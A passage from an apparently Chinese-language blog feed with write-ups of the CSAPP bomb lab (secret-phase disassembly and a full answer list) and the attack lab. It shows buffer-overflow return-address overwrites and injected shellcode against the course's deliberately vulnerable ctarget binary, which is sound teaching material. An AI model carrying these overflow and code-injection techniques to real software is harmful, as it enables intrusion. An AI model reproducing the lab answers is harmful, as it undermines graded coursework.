ff ff ff       	callq  401204 &lt;fun7&gt; #递归</span><br><span class="line">  401232:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax #翻倍+1 调用右子树</span><br><span class="line">  401236:	eb 05                	jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401238:	b8 ff ff ff ff       	mov    $0xffffffff,%eax #为null返回0xffffffff</span><br><span class="line">  40123d:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401241:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p><strong>满足6个数后phase_defused代码即0x4015e1之后:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4015e1:	4c 8d 44 24 10       	lea    0x`10(%rsp),%r8</span><br><span class="line">4015e6:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">4015eb:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">4015f0:	be 19 26 40 00       	mov    $0x402619,%esi</span><br><span class="line">4015f5:	bf 70 38 60 00       	mov    $0x603870,%edi</span><br><span class="line">4015fa:	e8 f1 f5 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">4015ff:	83 f8 03             	cmp    $0x3,%eax #查看是否三个参数 不相等跳转0x401635</span><br><span class="line">401602:	75 31                	jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">401604:	be 22 26 40 00       	mov    $0x402622,%esi #答案</span><br><span class="line">401609:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi #需要对比的字符串</span><br><span class="line">40160e:	e8 25 fd ff ff       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">401613:	85 c0                	test   %eax,%eax</span><br><span class="line">401615:	75 1e                	jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">401617:	bf f8 24 40 00       	mov    $0x4024f8,%edi</span><br><span class="line">40161c:	e8 ef f4 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">401621:	bf 20 25 40 00       	mov    $0x402520,%edi</span><br><span class="line">401626:	e8 e5 f4 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">40162b:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">401630:	e8 0d fc ff ff       	callq  401242 &lt;secret_phase&gt;</span><br></pre></td></tr></table></figure>



<ol>
<li><p>搜索<code>secret_phase</code>，发现在<code>phase_defused</code>调用，然后搜索<code>phase_defused</code>，发现每个<code>phase</code>结束后都会调用。但不确定是哪个phase</p>
<p><img src="/2023/10/25/CSAPP-3-bomblab/image-20231029160310128.png" alt="image-20231029160310128"></p>
</li>
<li><p>在<code>phase_defused</code>看什么情况下才能触发<code>secret_phase</code>，当操作数不等于6时，直接跳0x40163f，直接返回，跳过了secret_phase</p>
<p><img src="/2023/10/25/CSAPP-3-bomblab/image-20231029160612778.png" alt="image-20231029160612778"></p>
</li>
<li><p>当输入的字符串数量等于6时才判断是否调用secret函数。——-<strong>即必须要解答6个bomb后才能调用secret_phase</strong></p>
</li>
<li><p>查看0x4015e1后的代码，调用了sscanf函数 对输入的字符串进行模板对比。</p>
<ol>
<li>在b 0x4015e1 设置断点，查看 地址0x402619 即sscanf的输入格式 <code>%d %d %s</code></li>
<li>然后查看0x603870传入sscanf是什么数<code>x/s 0x603870</code>为<code>7 0</code> ，恰好是<code>phase_4</code>输入的答案，因此可以推断，<code>phase_4</code><strong>应该输入特定的答案从而触发</strong><code>secret_phase</code>。</li>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231029162326774.png" alt="image-20231029162326774"></li>
<li>再往下看，最后那个s%的字符串是是什么呢？可以看到将&#96;&#96;0x402622地址的字符串传入sstrings_not_equal<code> 判断与输入的是否相等 ，所以查看</code>0x402622<code>存放了什么。---</code>DrEvil&#96;</li>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231029163445370.png" alt="image-20231029163445370"></li>
</ol>
</li>
</ol>
<p><strong>secret_phase解析：</strong></p>
<ol>
<li><p>将<code>phase_4</code>答案后面加上<code>DrEvil</code></p>
</li>
<li><p><img src="/2023/10/25/CSAPP-3-bomblab/CSAPP-3-bomblab%5Cimage-20231029164152074.png" alt="image-20231029164152074"></p>
</li>
<li><p><code>b secret_phase</code>打上断点，然后运行<code>r ans.txt</code>，<code>layout asm</code>看到调用了 <code>strtol</code> 将输入的字符串转换成<code>long</code>，然后比较 <code>eax</code> 和<code>0x3e8[1000]</code></p>
</li>
<li><p>调用 func 传入的参数是（%edi（0x6030f0），%esi（用户输入）），只有当func 7的返回值为2时才能避免爆炸。</p>
</li>
<li><p><code>0x6030f0</code>这个数就推断是个地址，<code>x/130xw</code> 查看这个地址，每个节点占据32位 分别是 val值（前四字节）、填充（4字节）、左子节点地址（8字节）、右子节点（8字节）。因此可以得出这个是一个<strong>二叉树结构</strong></p>
</li>
<li><p><img src="/2023/10/25/CSAPP-3-bomblab/image-20231029192506719.png" alt="image-20231029192506719"></p>
</li>
<li><p>写成二叉树的形式如下：每个节点占据32位 分别是 val值（前四字节）、填充（4字节）、左子节点地址（8字节）、右子节点（8字节）。下面是16进制的表达</p>
</li>
<li><p><img src="/2023/10/25/CSAPP-3-bomblab/image-20231029192849626.png" alt="image-20231029192849626"></p>
</li>
<li><p>分析func7的汇编代码，可以写成如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">fun7</span><span class="params">(TreeNode* tree, <span class="type">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (tree-&gt;val &lt; num) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*<span class="built_in">fun7</span>(tree-&gt;right, num) +<span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(tree-&gt;val == num) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*<span class="built_in">fun7</span>(tree-&gt;left, num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>所以可以看出，想要返回2，输入的值必须在数中，否则会返回负数。并且左边递归会无法返回2，只会把原来的值加倍，<strong>因此需要原来右子树递归+1</strong>，获取1，然后利用2*fun7() 获得2.</p>
</li>
<li><p>从根节点出发0x24，那么若向右走，<code>则执行 2*fun7(tree-&gt;right, num) + 1</code>想要return 2，需要fun7() &#x3D;&#x3D;0.5，显然不可能，<code>那么从左走 2*fun7(tree-&gt;left, num)</code>，到达节点0x8 第二层，此时，前面一次选择已经有2的倍数了，所以只需要能够获得1即可，那么怎么获得1呢？—-&gt;向右走<code>2*fun7(tree-&gt;right, num) + 1</code> 使得num 等于 右边子树的一个<code>fun7()==0</code>，所以就可以获得1，最终得到<code>2*(fun7(tree-&gt;right,num) + 1)</code>.<strong>所以num &#x3D;  0x16 或0x14</strong></p>
</li>
</ol>
<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p><strong>答案：</strong></p>
<ol>
<li>Border relations with Canada have never been better.</li>
<li>1 2 4 8 16 32</li>
<li>0 207</li>
<li>7 0 DrEvil</li>
<li>9?NUVW</li>
<li>4 3 2 1 6 5</li>
<li>20 或 22</li>
</ol>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>bomblab</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-3-attacklab</title>
    <url>/2023/11/02/CSAPP-3-attacklab/</url>
    <content><![CDATA[<h1 id="1-attack-lab-引言"><a href="#1-attack-lab-引言" class="headerlink" title="1.attack lab 引言"></a>1.attack lab 引言</h1><p><strong>参考：</strong></p>
<ul>
<li><a href="https://blog.csdn.net/qq_25591221/article/details/123301271?ops_request_misc=%7B%22request_id%22:%22166996863216800184131554%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=166996863216800184131554&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123301271-null-null.142%5Ev67%5Econtrol,201%5Ev3%5Eadd_ask,213%5Ev2%5Et3_esquery_v3&utm_term=attacklab&spm=1018.2226.3001.4187">【精选】CSAPP-Lab03 Attack Lab 详细解析-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/qq_53336526/article/details/128236163">【精选】CSAPP–ATTACKLAB实验_attack lab-CSDN博客</a></li>
</ul>
<p><strong>目的：</strong>理解缓冲区溢出错误</p>
<p><strong>文件解析：</strong></p>
<ul>
<li><code>ctarget</code>一个易受到code-injection攻击的可执行程序</li>
<li><code>rtarget</code>一个人易受到return-oriented-programming攻击的可执行程序</li>
<li><code>cookie</code>一个8位的十六进制编码，唯一标识符用于身份验证</li>
<li><code>farm</code>目标gadget-farm的源代码，产生return-oriented programming的时候会用到</li>
<li><code>hex2raw</code>一个生成攻击字符串的程序</li>
</ul>
<p><strong>函数运行：</strong></p>
<ul>
<li>当运行<code>./ctarget</code>报错<code>Running on an illegal host [DESKTOP-7HBMUNV]</code></li>
<li>则需要运行<code>./ctarget -q</code>不参与在线评分系统</li>
<li><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102151714240.png" alt="image-20231102151714240"></li>
</ul>
<p><strong>实验阶段：</strong></p>
<p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102152252030.png" alt="image-20231102152252030"></p>
<h1 id="2-code-injection-attacks"><a href="#2-code-injection-attacks" class="headerlink" title="2.code-injection-attacks"></a>2.code-injection-attacks</h1><p>利用字符串攻击ctarget</p>
<h2 id="2-1-lever-1"><a href="#2-1-lever-1" class="headerlink" title="2.1 lever 1"></a>2.1 lever 1</h2><ul>
<li><p>不需要注入新代码，输入字符串需要指引程序去执行一个已经存在的函数。</p>
</li>
<li><p>ctarget中函数test调用了 getbuf，test的函数如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123; </span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf(); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>getbuf执行返回语句时（第五行），按照规则，程序会继续执行test函数中的语句，而我们想要改变这个行为，touch1代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>任务让ctarget在getbuf执行返回语句后执行touch1的代码，注意：攻击字符串可以破坏栈中不直接和本阶段相关的部分，这不会造成问题，因为touch1会使得程序直接退出。</p>
</li>
</ul>
<p><strong>建议：</strong></p>
<ul>
<li>设计本阶段的攻击字符串所需的信息都从检查CTARGET的反汇编代码中获得。用objdump -d进行反汇编。</li>
<li>主要思路是找到touch1的起始地址的字节表示的位置，使得getbuf结尾处的ret指令会将控制转移到touch1。</li>
<li>注意字节顺序。</li>
<li>可能需要用GDB单步跟踪调试getbuf的最后几条指令，确保它按照你期望的方式工作。</li>
<li>buf在getbuf栈帧中的位置取决于编译时常数BUFFER_SIZE的值，以及GCC使用的分配策略。你需要检查反汇编带来来确定它的位置。</li>
</ul>
<p><strong>思路：</strong></p>
<ul>
<li><p>对ctarget仅下反汇编。</p>
</li>
<li><p>得到test的反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:	48 83 ec 08          	sub    $0x8,%rsp  #栈顶开辟8字节</span><br><span class="line">  40196c:	b8 00 00 00 00       	mov    $0x0,%eax  #eax = 0</span><br><span class="line">  401971:	e8 32 fe ff ff       	callq  4017a8 &lt;getbuf&gt; #调用getbuf</span><br><span class="line">  401976:	89 c2                	mov    %eax,%edx #edx = eax</span><br><span class="line">  401978:	be 88 31 40 00       	mov    $0x403188,%esi #</span><br><span class="line">  40197d:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401982:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401987:	e8 64 f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401990:	c3                   	retq   </span><br></pre></td></tr></table></figure>
</li>
<li><p>getbuf的反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp #0x28 = 40 开辟了40字节的栈空间</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br></pre></td></tr></table></figure>


</li>
<li><p>以及touch1的反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip) # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:	00 00 00 </span><br><span class="line">  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  4017dd:	e8 ab 04 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  4017e7:	e8 54 f6 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>test 栈顶开辟了0x8 8个字节地址空间，getbuf栈顶开辟了0x28  40个字节地址空间，所以此时的栈顶结构如下：</p>
<ul>
<li></li>
</ul>
<table>
<thead>
<tr>
<th align="center">栈</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"></td>
<td align="center">test</td>
</tr>
<tr>
<td align="center">返回地址</td>
<td align="center">ret</td>
</tr>
<tr>
<td align="center">%rsp + 40</td>
<td align="center">getbuf</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">%rsp</td>
<td align="center">栈顶</td>
</tr>
</tbody></table>
</li>
<li><p>要让 getbuf 返回后执行touch1 的代码。也就是<strong>返回地址应该改为touch1的值（0x4017c0）</strong></p>
</li>
<li><p>所以可以让输入占满 getbuf 开辟的0x28占空间，并在在字符串中写入touch1的地址值。<strong>注意地址输入的顺序是小端</strong></p>
</li>
<li><p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102165418327.png" alt="image-20231102165418327"></p>
</li>
<li><p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102165510296.png" alt="image-20231102165510296"></p>
</li>
</ul>
<h2 id="2-2-level-2"><a href="#2-2-level-2" class="headerlink" title="2.2 level 2"></a>2.2 level 2</h2><ul>
<li><p>touch2的代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span>&#123; </span><br><span class="line">    vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span>  </span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val); </span><br><span class="line">        validate(<span class="number">2</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val); </span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>必须使得ctarget执行touch2的代码而不是返回test函数，必须要让touch2 以为收到的参数是你的<code>cookie（0x59b997fa）</code>。</p>
</li>
</ul>
<p><strong>建议：</strong></p>
<ul>
<li>需要确定注入代码的地址的字节表示位置，能够使得getbuf代码最后ret指令能够转移到那里</li>
<li>函数的第一个参数是放在寄存器%rdi中</li>
<li>注入的代码必须将寄存器的值设定你的cookie，然后利用ret指令将控制转移到touch2的第一条指令</li>
<li>不要在攻击代码中使用 jmp 或 call 命令，这些指令编码的地址很难确定，所以的控制转移都要使用ret指令，即使实际上你并不是要从一个函数调用返回</li>
</ul>
<p><strong>思路：</strong></p>
<ul>
<li><p>touch2 的汇编代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:	48 83 ec 08          	sub    $0x8,%rsp    #8个字节</span><br><span class="line">  4017f0:	89 fa                	mov    %edi,%edx</span><br><span class="line">  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017f9:	00 00 00 </span><br><span class="line">  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401802:	75 20                	jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi</span><br><span class="line">  401809:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40180e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401813:	e8 d8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40181d:	e8 6b 04 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  401822:	eb 1e                	jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:	be 10 31 40 00       	mov    $0x403110,%esi</span><br><span class="line">  401829:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40182e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401833:	e8 b8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40183d:	e8 0d 05 00 00       	callq  401d4f &lt;fail&gt;</span><br><span class="line">  401842:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401847:	e8 f4 f5 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>touch2</code> 函数的地址位<code>0x4017ec</code>。</p>
</li>
<li><p>不仅仅需要修改返回地址调用<code>touch2</code>函数，而已还要把<code>cookie</code>作为参数传递进去，题目不建议使用<code>jmp</code> 和<code>call</code>指令进行跳转，所以只能通过在栈中保存目标代码的地址，然后以<code>ret</code>的形式进行跳转。</p>
</li>
<li><p><code>ret</code>指令：</p>
<ul>
<li>x86-64用%rip表示程序计数器，它时刻指向下一条要执行的指令在内存中的地址</li>
<li>于是<code>ret</code>指令就相当于<code>pop %rip</code> 把栈中存放的地址弹出作为下一条指令的地址</li>
<li>所以可以利用<code>push</code> 和 <code>ret</code>就能实现指令的转移</li>
</ul>
</li>
<li><p>做法如下：</p>
<ul>
<li>首先输入字符串把<code>caller</code>的栈中的存储的返回地址修改为注入代码存放的地址</li>
<li>注入代码：<ul>
<li>查看<code>cookie</code>的值，将第一个参数寄存器修改为该值</li>
<li>在栈中压入<code>touch2</code>的地址</li>
<li>ret指令调用返回值即是<code>touch2</code></li>
</ul>
</li>
<li>注入代码的地址，注入代码应该存放在<code>getbuf</code>分配的<code>0x28</code>大小的栈中，地址为<code>getbuf</code>栈顶。</li>
</ul>
</li>
<li><p>注入代码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq $0x59b997fa %rdi #将cookie的值传入 rdi中</span><br><span class="line">pushq &amp;0x4017ec 	  #touch2函数的地址</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
</li>
<li><p>接下来利用gdb获取getbuf 的栈顶位置，</p>
<ul>
<li><code>b getbuf()</code>在getbuf函数打上断点</li>
<li><code>r -q</code> 执行程序</li>
<li><code>stepi</code>单步进入函数内部 一遍获取 rsp的值 </li>
<li><code>p/x $rsp</code> 按照16进制print出 $rsp的值</li>
<li><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102201624826.png" alt="image-20231102201624826"></li>
<li>所以<code>%rsp</code>中存放的值是<code>0x5561dc78</code>也就是下一个程序执行的地址 应该是我们要修改的返回地址</li>
</ul>
</li>
<li><p>逻辑：</p>
<ul>
<li><code>getbuf</code>执行完<code>ret</code>后，弹出注入代码的地址</li>
<li>程序执行注入代码，再次执行<code>ret</code> 弹出<code>touch2</code>函数的代码</li>
</ul>
</li>
</ul>
<p><strong>实现：</strong></p>
<ul>
<li>将汇编代码写在c2.s文件中，然后进行编译，使用<code>gcc -c c2.s</code>和<code>objdump -d c2.o &gt; c2.d</code>得到字节级的表示</li>
<li><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102205115761.png" alt="image-20231102205115761"></li>
<li>将字节放到<strong>40个字节</strong>的开头，然后代码地址放在溢出的部分，那么<code>getbuf</code>读取字符串的时候会溢出，此时<code>栈顶rsp</code>存放的地址是<code>0x5561dc78</code>，并且栈已经被注入代码覆盖，然后<code>ret</code>到代码地址，运行注入代码，写入<code>cookie</code>和<code>touch2</code> 的地址。</li>
<li><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102212131186.png" alt="image-20231102212131186"></li>
<li><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102212217851.png" alt="image-20231102212217851"></li>
</ul>
<h2 id="2-3-level-3"><a href="#2-3-level-3" class="headerlink" title="2.3 level 3"></a>2.3 level 3</h2><p>同样是注入攻击，但是是传递字符串作为参数</p>
<p><code>hexmatch</code>代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">	<span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>; <span class="comment">//s是随机的</span></span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);    </span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> <code>touch3</code>代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">	vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		fail(<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>目的是让<code>ctarget</code>执行<code>touch3</code> 而不是返回<code>test</code></p>
<p><strong>建议：</strong></p>
<ul>
<li>攻击字符串中要包含<code>cookie</code>的字符串，这个字符串由8个16进制数字组成顺序由高位到地位，开头没有0x</li>
<li>字符串在c语言中表示为字节序列，后跟值0的字节</li>
<li>注入代码应该将寄存器%rdi设置为攻击字符串的地址</li>
<li>调用<code>hexmatch和strncmp</code>函数的时候，会将数据压入栈中，覆盖getbuf使用的缓冲区的内存，需要将cookie字符串放置在合适的地方</li>
</ul>
<p><strong>思路：</strong></p>
<ul>
<li>本题与<code>phase2</code>类似，区别是本题传入的是字符串，切需要将<code>cookie</code>字符串放置在合适的位置</li>
<li><code>char *s = cbuf + random() % 100; //s是随机的</code> hexmatch中这一行代码表面 s是随机的，<strong>再然后根据建议4</strong>，所以如果跟<code>phase2</code>一样注入<code>getbuf</code>函数的栈中的话，可能会被被覆盖，所以不能将字符串放在<code>getbuf的</code>栈中，所以可以放置在<code>test</code>的栈中。</li>
<li>其余思路跟phase2差不多</li>
</ul>
<p><strong>实现：</strong></p>
<ul>
<li><p>test的反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:	48 83 ec 08          	sub    $0x8,%rsp  #栈顶开辟8字节</span><br><span class="line">  40196c:	b8 00 00 00 00       	mov    $0x0,%eax  #eax = 0</span><br><span class="line">  401971:	e8 32 fe ff ff       	callq  4017a8 &lt;getbuf&gt; #调用getbuf</span><br><span class="line">  401976:	89 c2                	mov    %eax,%edx #edx = eax</span><br><span class="line">  401978:	be 88 31 40 00       	mov    $0x403188,%esi #</span><br><span class="line">  40197d:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401982:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401987:	e8 64 f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401990:	c3   </span><br></pre></td></tr></table></figure>
</li>
<li><p>touch3的反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa:	53                   	push   %rbx</span><br><span class="line">  4018fb:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  401905:	00 00 00 </span><br><span class="line">  401908:	48 89 fe             	mov    %rdi,%rsi</span><br><span class="line">  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401911:	e8 36 ff ff ff       	callq  40184c &lt;hexmatch&gt;</span><br><span class="line">  401916:	85 c0                	test   %eax,%eax</span><br><span class="line">  401918:	74 23                	je     40193d &lt;touch3+0x43&gt;</span><br><span class="line">  40191a:	48 89 da             	mov    %rbx,%rdx</span><br><span class="line">  40191d:	be 38 31 40 00       	mov    $0x403138,%esi</span><br><span class="line">  401922:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401927:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40192c:	e8 bf f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401931:	bf 03 00 00 00       	mov    $0x3,%edi</span><br><span class="line">  401936:	e8 52 03 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  40193b:	eb 21                	jmp    40195e &lt;touch3+0x64&gt;</span><br><span class="line">  40193d:	48 89 da             	mov    %rbx,%rdx</span><br><span class="line">  401940:	be 60 31 40 00       	mov    $0x403160,%esi</span><br><span class="line">  401945:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40194a:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40194f:	e8 9c f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401954:	bf 03 00 00 00       	mov    $0x3,%edi</span><br><span class="line">  401959:	e8 f1 03 00 00       	callq  401d4f &lt;fail&gt;</span><br><span class="line">  40195e:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401963:	e8 d8 f4 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>


</li>
<li><p>使用gdb调试 获取test栈指针的地址<code>0x5561dca8</code>   这个地址就是我们<code>cookie</code>字符串需要存放的地址，也是调用<code>touch3</code>应该传入的参数，由touch3 的地址为<code>0x4018fa</code></p>
<ul>
<li><code>b $0x401968</code>设置断点</li>
<li><code>r -q</code> 运行</li>
<li><code>stepi</code> 单步执行进入函数</li>
